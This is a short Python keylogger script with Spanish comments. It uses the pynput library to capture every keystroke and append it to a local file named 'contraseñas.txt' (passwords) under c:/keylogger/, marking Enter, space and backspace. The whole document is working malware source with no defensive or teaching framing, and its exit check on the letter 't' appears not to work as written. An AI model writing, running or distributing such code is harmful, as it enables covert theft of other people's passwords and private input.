
import datetime
import sys
from pynput.keyboard import Listener

d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

# f= open('keylogger_{}.text'.format(d))


def key_recorder(key):
    # entre comillas indica la ruta absoluta de la carpeta de destino del txt 
    f=open("c:/keylogger/contraseñas.txt", "a",encoding="utf-8")
    # print(key.char)
    print(key)

    if str(key) == 'Key.enter':
        f.write(str(' \n '))
    
    elif str(key) == 'Key.space':
        f.write(str('  '))
    elif str(key) =='Key.backspace':
        f.write(str(' %BORRAR% '))
    else:
        f.write(str(key).strip("\'"))
        f.write(' ')
    if key=='t':
        f.close()
        sys.exit()
    
 

with Listener(on_press=key_recorder) as l:
    l.join() 
     
  










  

   